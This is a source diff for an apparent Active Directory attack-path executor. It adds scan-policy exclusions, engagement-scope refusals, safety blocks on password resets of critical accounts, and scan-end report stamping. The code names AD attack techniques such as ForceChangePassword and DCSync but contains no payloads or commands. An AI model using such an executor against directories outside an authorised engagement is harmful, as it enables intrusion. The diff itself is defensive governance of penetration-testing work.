@@ -11,6 +11,10 @@ The goal is to reuse this flow from multiple places (e.g. Phase 2 summary,
 
 from __future__ import annotations
 
+from adscan_core.scan_policy import settings as policy_settings
+
+from adscan_internal.services.ledger_guard import ledger_or_warn
+
 from enum import Enum
 from typing import Any, Callable
 from contextlib import contextmanager
@@ -37,6 +41,12 @@ from adscan_internal import (
     print_warning,
     print_warning_debug,
     telemetry,
+)
+from adscan_core.path_offer import build_path_offer_context
+from adscan_core.reporting.path_node_kinds import derive_path_node_kinds
+from adscan_core.reporting.step_outcome_note import (
+    OUTCOME_NOTE_KEY,
+    SESSION_IDENTITY_OUTCOME,
 )
 from adscan_core.rich_output import (
     questionary_checkbox_values,
@@ -129,6 +139,19 @@ from adscan_internal.cli.attack_step_followups import (
     build_followups_for_step,
     execute_guided_followup_actions,
 )
+from adscan_core.reporting.attack_path_execution_events import (
+    MODE_CONTINUOUS,
+    MODE_STEP,
+)
+from adscan_internal.services.attack_path_execution_run import (
+    AttackPathExecutionRun,
+    get_active_execution_run,
+    install_execution_run,
+    new_run_id,
+    notify_legacy_event,
+    prompt_execution_mode,
+    resolve_default_execution_mode,
+)
 from adscan_internal.services.attack_step_support_registry import (
     CONTEXT_ONLY_RELATIONS,
     POLICY_BLOCKED_RELATIONS,
@@ -140,8 +163,10 @@ from adscan_internal.services.attack_step_support_registry import (
     normalize_search_mode_label,
 )
 from adscan_internal.services.destructive_action_policy import (
+    DANGEROUS_DESTRUCTIVE_MARKER,
     classify_destructive,
     is_machine_account_name,
+    step_target_identity,
 )
 from adscan_internal.services.ldap_transport_service import (
     prepare_kerberos_ldap_environment,
@@ -154,6 +179,10 @@ from adscan_internal.services.attack_step_catalog import (
     relation_counts_for_execution_readiness,
     relation_requires_execution_context,
     required_context_for_relation,
+)
+from adscan_internal.services import scan_policy_enforcement
+from adscan_core.reporting.engagement_scope import (
+    EXECUTION_STATUS_OUTSIDE_SCOPE as _EXECUTION_STATUS_OUTSIDE_SCOPE,
 )
 from adscan_internal.services.attack_paths_core import (
     collapsed_pivot_fanout_relation,
@@ -354,9 +383,18 @@ def _resolve_roast_target_domain(
     )
 
 
-def _is_audit_mode(shell: Any) -> bool:
-    """Return whether the current shell is running in audit mode."""
-    return str(getattr(shell, "type", "") or "").strip().lower() == "audit"
+def _writelogonscript_needs_confirmation(shell: Any) -> bool:
+    """Whether WriteLogonScript staging is confirmed before it runs.
+
+    The scan policy decides through the consent seam: a policy that consents to
+    the step by default (Lab / CTF) stages it; any other asks, and an unattended
+    run declines.
+    """
+    from adscan_internal.services.directory_change_consent import (  # noqa: PLC0415
+        directory_change_consent_default,
+    )
+
+    return not directory_change_consent_default(shell, check_id="step:writelogonscript")
 
 
 def _get_stored_domain_credential_for_user(
@@ -565,12 +603,15 @@ def _step_destructive_safety_block(step: dict[str, Any]) -> tuple[bool, str]:
     """Return ``(hard_blocked, client_safe_reason)`` for one path step.
 
     Target-aware safety check for a destructive step that the relation-NAME-only
-    classifier cannot catch: a ForceChangePassword whose TARGET is a computer /
-    machine account (resetting a host password is disruptive). The four
-    statically ``policy_blocked`` techniques are already handled by the
-    name-based classifier and are intentionally excluded here so this only adds
-    the target-dependent block. Uses the destructive-action SSOT so the display
-    "blocked" and the executor never disagree.
+    classifier cannot catch: a password reset (ForceChangePassword, or
+    AllExtendedRights on a user) whose TARGET is an account a running system
+    depends on (a computer, krbtgt, a managed service account, an Entra ID sync
+    account). The four statically ``policy_blocked`` techniques are already
+    handled by the name-based classifier and are intentionally excluded here so
+    this only adds the target-dependent block. Uses the destructive-action SSOT,
+    fed the target identity the step carries (``target_sid`` / ``target_dn`` /
+    ``target_samaccountname`` and any class the graph stamp recorded), so the
+    display "blocked" and the executor never disagree.
     """
     if not isinstance(step, dict):
         return False, ""
@@ -583,7 +624,9 @@ def _step_destructive_safety_block(step: dict[str, Any]) -> tuple[bool, str]:
     to_label = str(details.get("to") or "")
     if is_machine_account_name(to_label):
         target_kind = "computer"
-    verdict = classify_destructive(action, target_kind)
+    verdict = classify_destructive(
+        action, target_kind, target=step_target_identity(details)
+    )
     return verdict.hard_blocked, verdict.client_safe_reason
 
 
@@ -985,10 +1028,21 @@ def persist_attack_path_snapshot(
                         else None
                     ),
                     "nodes": [str(node or "") for node in nodes],
+                    # Real graph kind per node (parallel to ``nodes``) so the web
+                    # never has to guess User/Group/Computer/Domain from a label.
+                    "node_kinds": derive_path_node_kinds(nodes, steps),
                     "relations": [str(relation or "") for relation in relations],
                     "steps": steps,
                 }
             )
+            # The other domains this route's Tier-0 asset also reaches, for the
+            # web CTEM's "this route also reaches <domain>" line. Written only
+            # when present, so a single-domain snapshot is unchanged.
+            also_reaches = summary.get("also_reaches_domains")
+            if isinstance(also_reaches, list) and also_reaches:
+                snapshot_paths[-1]["also_reaches_domains"] = [
+                    dict(entry) for entry in also_reaches if isinstance(entry, dict)
+                ]
 
         payload = {
             "schema_version": "1.0",
@@ -1031,6 +1085,11 @@ def rematerialize_attack_path_snapshot(
     uses (:func:`attack_graph_service.compute_display_paths_for_domain`), then
     persists them. Because the source is always the reconciled graph — never a
     stale copy — a stale status is now structurally impossible.
+
+    The same canonical listing then stamps the headline report blocks
+    (``exposure_score``, ``exposure_kpis``, ``chokepoint_cardinality``; see
+    :func:`_stamp_headline_blocks_from_canonical_listing`), so they are a
+    property of a completed scan rather than of a report having been rendered.
 
     Best-effort: never raises, never affects the scan flow. Returns the freshly
     computed summaries (so a caller can reuse them, e.g. the loot card) or ``None``.
@@ -1079,7 +1138,46 @@ def rematerialize_attack_path_snapshot(
         target="highvalue",
         target_mode="object",
     )
+    _stamp_headline_blocks_from_canonical_listing(shell, domain, summaries)
     return summaries
+
+
+def _stamp_headline_blocks_from_canonical_listing(
+    shell: Any, domain: str, summaries: list[dict[str, Any]]
+) -> None:
+    """Stamp the domain's headline report blocks from the listing just computed.
+
+    ``exposure_score``, ``exposure_kpis`` and ``chokepoint_cardinality`` used to
+    be stamped ONLY by the report flows, so a scan that finished without
+    rendering a report (``adscan ci`` without ``--generate-report``, the web's
+    default scan) carried none of them, and every SSOT-first web route quietly
+    fell back to a weaker legacy derivation. A headline figure must not depend on
+    a rendering step, so the scan's own finalization seam stamps all three from
+    the SAME canonical domain listing it persists for the web, through the
+    tier-shared :func:`scan_headline_blocks.stamp_headline_blocks_for_domain`.
+
+    Every block is overwritten: these summaries were just recomputed from the
+    reconciled graph, so a block a previous run left is stale by definition. An
+    EMPTY listing is stamped too (an honest zero for a domain the scan assessed);
+    a failed computation never reaches here, so it can never masquerade as a
+    zero. Best-effort: never raises into the scan flow.
+    """
+    try:
+        from adscan_internal.services.scan_headline_blocks import (
+            stamp_headline_blocks_for_domain,
+        )
+
+        stamp_headline_blocks_for_domain(
+            resolve_workspace_cwd(shell),
+            domain,
+            summaries=summaries,
+            engine_marker_bounded=(
+                getattr(shell, "_attack_path_engine_used", None) == "fallback"
+            ),
+        )
+    except Exception as exc:  # noqa: BLE001 - never affects the scan flow
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
 
 
 def rematerialize_attack_path_snapshots_at_scan_end(shell: Any) -> None:
@@ -1104,10 +1202,21 @@ def rematerialize_attack_path_snapshots_at_scan_end(shell: Any) -> None:
     2. ``rematerialize_attack_path_snapshot`` per domain — keeps the web-consumed
        snapshot in lockstep with reality without scattering per-step incremental
        writes (the scattered-writer pattern that produced the stale-status bug).
+    3. ``stamp_host_reach_coverage_for_all_domains`` — the network-reach
+       coverage block, from the latest reachability measurement.
 
     Findings are reconciled first so the technical report reflects the final
     graph before the snapshot projection is rebuilt. Best-effort: never raises.
     """
+    # Scope and method disclosure (scan policy + assessment pace), stamped FIRST
+    # so the finding reconciliation below (a stub-shell writer) already keeps
+    # excluded detections out (S7) and the compliance stamp sees the block.
+    from adscan_internal.services.scan_controls_disclosure import (
+        stamp_scan_controls_disclosure,
+    )
+
+    stamp_scan_controls_disclosure(shell)
+
     try:
         workspace_dir = str(getattr(shell, "current_workspace_dir", "") or "")
         if workspace_dir:
@@ -1123,6 +1232,7 @@ def rematerialize_attack_path_snapshots_at_scan_end(shell: Any) -> None:
             f"[attack_paths] scan-end finding reconciliation failed: {exc}"
         )
 
+    listings: dict[str, list[dict[str, Any]]] = {}
     try:
         domains_data = getattr(shell, "domains_data", {}) or {}
         if not isinstance(domains_data, dict):
@@ -1130,12 +1240,80 @@ def rematerialize_attack_path_snapshots_at_scan_end(shell: Any) -> None:
         for domain in list(domains_data.keys()):
             if not isinstance(domain, str) or not domain.strip():
                 continue
-            rematerialize_attack_path_snapshot(shell, domain)
+            summaries = rematerialize_attack_path_snapshot(shell, domain)
+            if isinstance(summaries, list):
+                listings[domain] = summaries
     except Exception as exc:  # noqa: BLE001
         telemetry.capture_exception(exc)
         print_info_debug(
             f"[attack_paths] scan-end snapshot re-materialization failed: {exc}"
         )
+
+    # Network-reach coverage, re-derived from the LATEST reachability
+    # measurement (a pivot may have widened it since the reachability pass) and
+    # stamped for every domain, including one whose reachability pass never ran.
+    # Stamped here rather than in a report step so a scan that generates no
+    # report still declares the computers it could not reach.
+    from adscan_internal.services.host_reach_coverage_stamp import (
+        stamp_host_reach_coverage_for_all_domains,
+    )
+
+    stamp_host_reach_coverage_for_all_domains(shell)
+
+    # The workspace-wide "Start here" the SAR prints, ranked once over every
+    # domain's canonical listing, so the web CTEM serves the deliverable's own
+    # ranking instead of combining per-domain blocks. After the loop: it merges
+    # the per-domain choke blocks each iteration just stamped.
+    if listings:
+        try:
+            from adscan_internal.services import scan_headline_blocks
+
+            scan_headline_blocks.stamp_workspace_remediation(
+                resolve_workspace_cwd(shell), listings
+            )
+        except Exception as exc:  # noqa: BLE001 - never affects the scan flow
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+
+    # Re-stamp with the canonical listing so the block counts the routes the
+    # policy kept from being walked end to end.
+    if listings:
+        stamp_scan_controls_disclosure(shell, listings=listings)
+
+    # 3. The blocks only the report step used to write (assessment, the
+    #    affected assets and the final ADscan severity they imply, compliance for
+    #    the scan's selected frameworks, the fan-out rollup). What the web shows
+    #    must not depend on whether a report was rendered.
+    try:
+        workspace_dir = str(resolve_workspace_cwd(shell) or "")
+        if workspace_dir:
+            from adscan_internal.services.scan_headline_blocks import (
+                stamp_scan_end_report_blocks,
+            )
+
+            stamp_scan_end_report_blocks(
+                workspace_dir,
+                summaries_by_domain=listings,
+                frameworks=scan_compliance_frameworks(shell),
+            )
+    except Exception as exc:  # noqa: BLE001 - never affects the scan flow
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+
+
+#: Shell attribute carrying the compliance frameworks THIS scan selected
+#: (``adscan ci --frameworks``). A scan property, not a render property: the
+#: scan-end seam stamps the compliance block from it, so the web shows the
+#: mapping without waiting for a report.
+SCAN_COMPLIANCE_FRAMEWORKS_ATTR = "_scan_compliance_frameworks"
+
+
+def scan_compliance_frameworks(shell: Any) -> list[str]:
+    """Return the compliance frameworks the running scan selected (may be empty)."""
+    raw = getattr(shell, SCAN_COMPLIANCE_FRAMEWORKS_ATTR, None)
+    if not isinstance(raw, (list, tuple)):
+        return []
+    return [str(item).strip().lower() for item in raw if str(item).strip()]
 
 
 def _attack_path_event_id(summary: dict[str, Any]) -> str:
@@ -1193,6 +1371,17 @@ def _record_attack_path_execution_event(
 
     This is best-effort only and must never alter the existing CLI execution flow.
     """
+    notify_legacy_event(
+        shell,
+        stage=str(event_stage or "").strip(),
+        step_index=int(step_index) if step_index is not None else None,
+        action=action,
+        from_label=from_label,
+        to_label=to_label,
+        reason=reason,
+        actor=actor,
+        target_host=target_host,
+    )
     record_technical_event = load_optional_report_service_attr(
         "record_technical_event",
         action="Technical event sync",
@@ -1827,7 +2016,634 @@ def annotate_summary_execution_readiness(
     )
     if readiness:
         meta.update(readiness)
+    _apply_scan_policy_readiness(shell, current, meta)
+    _apply_engagement_scope_readiness(shell, domain=domain, summary=current, meta=meta)
     return current
+
+
+def _relation_is_executable_step(action: str) -> bool:
+    """The executor's own notion of an executable step (not glue, not hard-blocked).
+
+    Mirrors the step loop: ``CONTEXT_ONLY_RELATIONS`` are skipped and
+    ``POLICY_BLOCKED_RELATIONS`` are the safety abstentions. The readiness
+    predicate is narrower (it leaves out custom-branch techniques), so it cannot
+    decide which step a path would execute first.
+    """
+    key = str(action or "").strip().lower()
+    return bool(key) and key not in CONTEXT_ONLY_RELATIONS and key not in POLICY_BLOCKED_RELATIONS
+
+
+def _apply_scan_policy_readiness(
+    shell: Any, summary: dict[str, Any], meta: dict[str, Any]
+) -> None:
+    """Overlay the scan-policy verdict on a path's readiness meta (S3).
+
+    A path whose first pending executable step the policy excludes cannot start:
+    it is marked ``execution_support_status = excluded_by_scan_policy`` so every
+    offer surface lists it as "Not executed: excluded by scan policy" and none
+    auto-offers it (it is never dropped from the listing). A path that is only
+    cut short later carries the excluded relations for display and the
+    ``scan_policy_cut_short_at`` stamp the execution order reads; its read-only
+    prefix still runs, a directory write in it is held back (decision D-2b,
+    2026-11-08). No policy: nothing is written.
+    """
+    if not scan_policy_enforcement.policy_active(shell):
+        return
+    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
+    excluded = scan_policy_enforcement.excluded_relations_in(shell, steps)
+    if not excluded:
+        return
+    meta["scan_policy_excluded_relations"] = excluded
+    # A pending excluded step anywhere in the path means the policy cuts it
+    # short: the execution order puts the paths it lets run end to end first
+    # (``build_path_execution_priority_key``), and the executor holds back a
+    # directory write that could not lead anywhere (``_prefix_write_held_back``).
+    pending = scan_policy_enforcement.pending_excluded_steps(
+        shell, steps, counts=_relation_is_executable_step
+    )
+    if pending:
+        cut_idx, cut_step = pending[0]
+        meta[scan_policy_enforcement.META_CUT_SHORT_AT_KEY] = cut_idx
+        meta[scan_policy_enforcement.META_CUT_SHORT_CHECK_KEY] = (
+            scan_policy_enforcement.check_id_for(
+                shell, relation=str(cut_step.get("action") or "")
+            )
+        )
+    first = scan_policy_enforcement.first_pending_excluded_step(
+        shell, steps, counts=_relation_is_executable_step
+    )
+    if first is None:
+        return
+    _idx, step = first
+    action = str(step.get("action") or "").strip()
+    check_id = scan_policy_enforcement.check_id_for(shell, relation=action)
+    title = scan_policy_enforcement.check_title(shell, check_id)
+    # Reason 2 (the policy enables the step and asks an operator, none present)
+    # and reason 1 (the policy excludes it) keep separate words and tokens.
+    awaiting = scan_policy_enforcement.refused_only_for_operator(shell, check_id)
+    meta["execution_support_status"] = scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED
+    if awaiting:
+        from adscan_core.scan_policy.execution import (  # noqa: PLC0415
+            MAP_ONLY_STEP_LABEL,
+            REASON_AWAITING_APPROVAL,
+        )
+
+        meta["execution_support_reason"] = (
+            f"{title} {MAP_ONLY_STEP_LABEL[0].lower()}{MAP_ONLY_STEP_LABEL[1:]}"
+        )
+        meta["execution_not_executed_reason"] = REASON_AWAITING_APPROVAL
+    else:
+        meta["execution_support_reason"] = (
+            f"Not executed: your scan policy excludes {title}."
+        )
+        meta["execution_not_executed_reason"] = scan_policy_enforcement.NOT_EXECUTED_REASON
+    meta["execution_scan_policy_check_id"] = check_id
+    meta["execution_context_action"] = action.lower()
+    # The listing labels the path as excluded; the end-of-scan recap names the
+    # policy and the command that turns the step back on. No line here: this
+    # overlay runs while the listing is computed.
+    from adscan_internal.services.scan_policy_notice import (  # noqa: PLC0415
+        notify_policy_skip,
+    )
+
+    notify_policy_skip(
+        shell,
+        [check_id],
+        subject=title,
+        key=check_id,
+        announce=False,  # the listing labels the path; the recap names the reason
+        awaiting_approval=awaiting,
+    )
+
+
+def _path_excluded_by_scan_policy(summary: dict[str, Any]) -> bool:
+    """True when the readiness overlay marked the path as policy-excluded."""
+    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
+    return (
+        isinstance(meta, dict)
+        and str(meta.get("execution_support_status") or "").strip().lower()
+        == scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED
+    )
+
+
+def _refuse_path_for_scan_policy(
+    shell: Any, *, domain: str, summary: dict[str, Any]
+) -> None:
+    """Refuse a whole path whose first pending step the policy excludes (S1).
+
+    The path stays mapped: its steps keep their status and the excluded step
+    carries the ``excluded_by_scan_policy`` note. One operator line, one run
+    refusal and one ``path_blocked`` execution event, never a safety label.
+    """
+    first = scan_policy_enforcement.first_pending_excluded_step(
+        shell,
+        summary.get("steps") if isinstance(summary.get("steps"), list) else [],
+        counts=_relation_is_executable_step,
+    )
+    if first is None:
+        return
+    step_index, step = first
+    details = step.get("details") if isinstance(step.get("details"), dict) else {}
+    action = str(step.get("action") or "").strip()
+    from_label = str(details.get("from") or "")
+    to_label = str(details.get("to") or "")
+    run = get_active_execution_run(shell)
+    if run is not None:
+        from adscan_internal.services.scan_policy_notice import (  # noqa: PLC0415
+            policy_skip_explanation,
+        )
+
+        run.refuse(
+            f"{action} {scan_policy_enforcement.REFUSAL_SUFFIX}",
+            explanation=policy_skip_explanation(
+                shell, scan_policy_enforcement.check_id_for(shell, relation=action)
+            ),
+        )
+
+    def _record(message: str, _details: dict[str, Any]) -> None:
+        _record_attack_path_execution_event(
+            shell,
+            domain=domain,
+            summary=summary,
+            event_stage="path_blocked",
+            message=message,
+            step_index=step_index,
+            action=action,
+            from_label=from_label,
+            to_label=to_label,
+            step_status="not_executed",
+            reason=scan_policy_enforcement.NOT_EXECUTED_REASON,
+        )
+
+    scan_policy_enforcement.refuse_relation(
+        shell,
+        action,
+        surface="attack_path",
+        domain=domain,
+        from_label=from_label,
+        to_label=to_label,
+        step_status=str(step.get("status") or "theoretical"),
+        event_recorder=_record,
+    )
+
+
+def _refuse_step_for_scan_policy(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    step: dict[str, Any],
+    step_index: int,
+    total_steps: int | None,
+    last_executable_idx: int | None,
+    from_label: str,
+    to_label: str,
+) -> None:
+    """Stop a path at a policy-excluded step after its allowed prefix ran (S2)."""
+    action = str(step.get("action") or "").strip()
+
+    def _record(message: str, _details: dict[str, Any]) -> None:
+        _record_attack_path_execution_event(
+            shell,
+            domain=domain,
+            summary=summary,
+            event_stage="step_blocked",
+            message=message,
+            step_index=step_index,
+            total_steps=total_steps,
+            last_executable_idx=last_executable_idx,
+            action=action,
+            from_label=from_label,
+            to_label=to_label,
+            step_status="not_executed",
+            reason=scan_policy_enforcement.NOT_EXECUTED_REASON,
+        )
+
+    scan_policy_enforcement.refuse_relation(
+        shell,
+        action,
+        surface="attack_path",
+        domain=domain,
+        from_label=from_label,
+        to_label=to_label,
+        step_status=str(step.get("status") or "theoretical"),
+        event_recorder=_record,
+    )
+
+
+def _step_engagement_scope(
+    shell: Any, *, domain: str, step: dict[str, Any]
+) -> Any:
+    """The engagement-scope verdict of one step (both axes, the scope SSOT)."""
+    from adscan_internal.services.engagement_scope import (  # noqa: PLC0415
+        step_scope_verdict,
+    )
+
+    details = step.get("details") if isinstance(step.get("details"), dict) else {}
+    return step_scope_verdict(
+        shell,
+        path_domain=domain,
+        from_label=str(details.get("from") or ""),
+        to_label=str(details.get("to") or ""),
+        details=details,
+    )
+
+
+def _first_pending_step_outside_scope(
+    shell: Any, *, domain: str, steps: list[Any]
+) -> tuple[int, dict[str, Any], Any] | None:
+    """The first pending executable step, when the engagement scope keeps it out."""
+    for idx, step in enumerate(steps or (), start=1):
+        if not isinstance(step, dict):
+            continue
+        action = str(step.get("action") or "").strip()
+        if not action or not _relation_is_executable_step(action):
+            continue
+        if scan_policy_enforcement.step_already_processed(step):
+            continue
+        verdict = _step_engagement_scope(shell, domain=domain, step=step)
+        return (idx, step, verdict) if not verdict.allowed else None
+    return None
+
+
+def _apply_engagement_scope_readiness(
+    shell: Any, *, domain: str, summary: dict[str, Any], meta: dict[str, Any]
+) -> None:
+    """Mark a route whose next step leaves the engagement scope as not startable.
+
+    No surface offers to run such a route, in any run mode: the scope is
+    contractual and is widened before the scan, never per step. The route stays
+    mapped (its statuses are untouched).
+    """
+    from adscan_core.reporting.engagement_scope import (  # noqa: PLC0415
+        EXECUTION_STATUS_OUTSIDE_SCOPE,
+        OUTSIDE_SCOPE_STEP_LABEL,
+    )
+
+    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
+    try:
+        hit = _first_pending_step_outside_scope(shell, domain=domain, steps=steps)
+    except Exception as exc:  # noqa: BLE001 - an unreadable step is not startable
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return
+    if hit is None:
+        return
+    _idx, step, verdict = hit
+    meta["execution_support_status"] = EXECUTION_STATUS_OUTSIDE_SCOPE
+    meta["execution_support_reason"] = OUTSIDE_SCOPE_STEP_LABEL
+    meta["execution_not_executed_reason"] = EXECUTION_STATUS_OUTSIDE_SCOPE
+    meta["execution_out_of_scope_domain"] = verdict.out_of_scope_domain
+    meta["execution_context_action"] = str(step.get("action") or "").strip().lower()
+
+
+def _path_outside_engagement_scope(summary: dict[str, Any]) -> bool:
+    """True when the readiness overlay marked the route as leaving the scope."""
+    from adscan_core.reporting.engagement_scope import (  # noqa: PLC0415
+        EXECUTION_STATUS_OUTSIDE_SCOPE,
+    )
+
+    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
+    return (
+        isinstance(meta, dict)
+        and str(meta.get("execution_support_status") or "").strip().lower()
+        == EXECUTION_STATUS_OUTSIDE_SCOPE
+    )
+
+
+def _refuse_path_outside_engagement_scope(
+    shell: Any, *, domain: str, summary: dict[str, Any]
+) -> None:
+    """Refuse a whole route whose first pending step leaves the engagement scope."""
+    steps = summary.get("steps") if isinstance(summary.get("steps"), list) else []
+    hit = _first_pending_step_outside_scope(shell, domain=domain, steps=steps)
+    if hit is None:
+        return
+    step_index, step, verdict = hit
+    _refuse_outside_scope_step(
+        shell,
+        domain=domain,
+        summary=summary,
+        step=step,
+        step_index=step_index,
+        verdict=verdict,
+        event_stage="path_blocked",
+    )
+
+
+def _refuse_outside_scope_step(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    step: dict[str, Any],
+    step_index: int,
+    verdict: Any,
+    event_stage: str,
+    total_steps: int | None = None,
+    last_executable_idx: int | None = None,
+) -> None:
+    from adscan_core.reporting.engagement_scope import (  # noqa: PLC0415
+        NOT_EXECUTED_OUTSIDE_SCOPE,
+    )
+    from adscan_internal.services.engagement_scope import (  # noqa: PLC0415
+        refuse_outside_scope,
+    )
+
+    action = str(step.get("action") or "").strip()
+    details = step.get("details") if isinstance(step.get("details"), dict) else {}
+    from_label = str(details.get("from") or "")
+    to_label = str(details.get("to") or "")
+
+    def _record(message: str, _details: dict[str, Any]) -> None:
+        _record_attack_path_execution_event(
+            shell,
+            domain=domain,
+            summary=summary,
+            event_stage=event_stage,
+            message=message,
+            step_index=step_index,
+            total_steps=total_steps,
+            last_executable_idx=last_executable_idx,
+            action=action,
+            from_label=from_label,
+            to_label=to_label,
+            step_status="not_executed",
+            reason=NOT_EXECUTED_OUTSIDE_SCOPE,
+        )
+
+    run = get_active_execution_run(shell) if event_stage == "path_blocked" else None
+    if run is not None:
+        try:
+            from adscan_core.reporting.engagement_scope import (  # noqa: PLC0415
+                OUTSIDE_SCOPE_STEP_LABEL,
+            )
+            from adscan_internal.services.engagement_scope import (  # noqa: PLC0415
+                outside_scope_line,
+            )
+
+            run.refuse(
+                f"{action} not executed: outside the engagement scope",
+                explanation={
+                    "code": "",
+                    "reason_code": NOT_EXECUTED_OUTSIDE_SCOPE,
+                    "headline": OUTSIDE_SCOPE_STEP_LABEL,
+                    "detail": outside_scope_line(
+                        action, to_label, verdict.out_of_scope_domain, marked=False
+                    ),
+                    "next_step": "",
+                },
+            )
+        except Exception as exc:  # noqa: BLE001 - the run view is best effort
+            telemetry.capture_exception(exc)
+            print_exception(exception=exc)
+    refuse_outside_scope(
+        shell,
+        relation=action,
+        out_domain=verdict.out_of_scope_domain,
+        surface="attack_path",
+        path_domain=domain,
+        from_label=from_label,
+        to_label=to_label,
+        source_domain=verdict.source.domain,
+        step_status=str(step.get("status") or "theoretical"),
+        event_recorder=_record,
+    )
+
+
+def _refuse_step_outside_engagement_scope(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    step: dict[str, Any],
+    step_index: int,
+    total_steps: int | None,
+    last_executable_idx: int | None,
+) -> bool:
+    """THE per-step engagement-scope seam of the executor loop.
+
+    Returns True (and records the refusal) when the step's acting object or
+    target belongs to a domain outside the engagement scope, so the caller stops
+    the route there. Every attack step passes through it before it runs; a
+    structural test keeps it in the loop.
+    """
+    verdict = _step_engagement_scope(shell, domain=domain, step=step)
+    if verdict.allowed:
+        return False
+    _refuse_outside_scope_step(
+        shell,
+        domain=domain,
+        summary=summary,
+        step=step,
+        step_index=step_index,
+        verdict=verdict,
+        event_stage="step_blocked",
+        total_steps=total_steps,
+        last_executable_idx=last_executable_idx,
+    )
+    return True
+
+
+def _prefix_write_held_back(
+    shell: Any,
+    *,
+    summary: dict[str, Any],
+    steps: list[Any],
+    step_index: int,
+    step: dict[str, Any],
+) -> dict[str, str] | None:
+    """The later excluded step that makes THIS directory write pointless, if any.
+
+    Founder decision 2026-11-08 (D-2b, replaces D-2 where they conflict): in a path the
+    scan policy cuts short, the read-only steps of the allowed prefix still run
+    (a recovered credential is a finding by itself), but a step that writes to
+    the directory runs only when the path can complete, or when the write lands
+    on the path's own terminal. Otherwise it would change the client's directory
+    without proving anything, which is exactly what an Audit or
+    Production-sensitive client chose to avoid.
+
+    Every term reads the enforcement SSOT: the excluded steps come from
+    ``pending_excluded_steps`` (the same reading the execution order uses) and
+    "writes" from the check registry's declared environment change.
+
+    Returns ``{"relation", "check_id", "title"}`` of the first excluded step after
+    this one, or ``None`` when the write may run (no policy, nothing excluded
+    later, a read-only step, or the write is the terminal).
+    """
+    if not scan_policy_enforcement.policy_active(shell):
+        return None
+    action = str(step.get("action") or "").strip()
+    if not action or not scan_policy_enforcement.relation_writes_directory(shell, action):
+        return None
+    later = [
+        (idx, excluded)
+        for idx, excluded in scan_policy_enforcement.pending_excluded_steps(
+            shell, steps, counts=_relation_is_executable_step
+        )
+        if idx > step_index
+    ]
+    if not later:
+        return None
+    details = step.get("details") if isinstance(step.get("details"), dict) else {}
+    terminal = _normalize_account(str(summary.get("target") or ""))
+    if terminal and _normalize_account(str(details.get("to") or "")) == terminal:
+        return None
+    relation = str(later[0][1].get("action") or "")
+    check_id = scan_policy_enforcement.check_id_for(shell, relation=relation)
+    return {
+        "relation": relation,
+        "check_id": check_id,
+        "title": scan_policy_enforcement.check_title(shell, check_id),
+    }
+
+
+def _operator_runs_held_back_write(shell: Any, *, action: str, title: str) -> bool:
+    """Interactive ``start``: show why the write cannot complete and let them choose.
+
+    An unattended run (``adscan ci``, ``adscan execute``, the web worker) and an
+    interactive auto mode never ask: the write is held back. Default No.
+    """
+    from adscan_core.scan_policy.execution import (  # noqa: PLC0415
+        ENTRY_INTERACTIVE,
+        run_entry,
+    )
+
+    if run_entry(shell) != ENTRY_INTERACTIVE or is_non_interactive(shell):
+        return False
+    print_warning(
+        f"{action} cannot be completed under this scan policy: {title} later in "
+        "this path is excluded, so this change would lead nowhere."
+    )
+    try:
+        from adscan_internal.rich_output import confirm_ask  # noqa: PLC0415
+
+        return bool(confirm_ask("Make this change anyway?", default=False))
+    except Exception as exc:  # noqa: BLE001 - a broken prompt declines
+        telemetry.capture_exception(exc)
+        print_exception(exception=exc)
+        return False
+
+
+def _hold_back_prefix_write(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    step: dict[str, Any],
+    step_index: int,
+    total_steps: int | None,
+    last_executable_idx: int | None,
+    held_back: dict[str, str],
+) -> None:
+    """Represent a held-back write exactly like a step the policy excluded.
+
+    The step never started, so it keeps its status; it carries the
+    ``excluded_by_scan_policy`` note naming the LATER excluded check, with its
+    own label (:func:`held_back_write_label`), and a ``step_blocked`` /
+    ``not_executed`` event. Every surface reads it through the shared annotation.
+    """
+    from adscan_core.scan_policy.annotate import (  # noqa: PLC0415
+        NOTE_LABEL_KEY,
+        held_back_write_label,
+    )
+
+    details = step.get("details") if isinstance(step.get("details"), dict) else {}
+    action = str(step.get("action") or "").strip()
+    from_label = str(details.get("from") or "")
+    to_label = str(details.get("to") or "")
+    label = held_back_write_label(held_back.get("title") or "")
+    notes = {
+        **scan_policy_enforcement.scan_policy_note(held_back.get("check_id") or ""),
+        NOTE_LABEL_KEY: label,
+    }
+    _update_attack_path_step_status_at_index(
+        shell,
+        domain=domain,
+        summary=summary,
+        step_index=step_index - 1,
+        status=str(step.get("status") or "theoretical"),
+        notes=notes,
+    )
+    _record_attack_path_execution_event(
+        shell,
+        domain=domain,
+        summary=summary,
+        event_stage="step_blocked",
+        message=f"{action} {label}.",
+        step_index=step_index,
+        total_steps=total_steps,
+        last_executable_idx=last_executable_idx,
+        action=action,
+        from_label=from_label,
+        to_label=to_label,
+        step_status="not_executed",
+        reason=scan_policy_enforcement.NOT_EXECUTED_REASON,
+    )
+
+
+def _settle_step_not_executed_by_policy(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    step_index: int,
+    total_steps: int | None,
+    executable_step_index: int | None,
+    last_executable_idx: int | None,
+    action: str,
+    from_label: str,
+    to_label: str,
+    pre_step_status: str,
+    refusal: dict[str, str],
+) -> None:
+    """Represent a step that ran nothing because its branch's technique was excluded.
+
+    The step's own relation was allowed, so it started (and was marked
+    ``attempted``), but the technique its branch would perform is excluded: a
+    GenericAll whose only route left is a password reset, an AllExtendedRights
+    remapped to DCSync, a group membership change. Nothing was tried, so it must
+    not read as attempted. It gets exactly what a step excluded directly gets
+    (:func:`_refuse_step_for_scan_policy`): its status before the step started
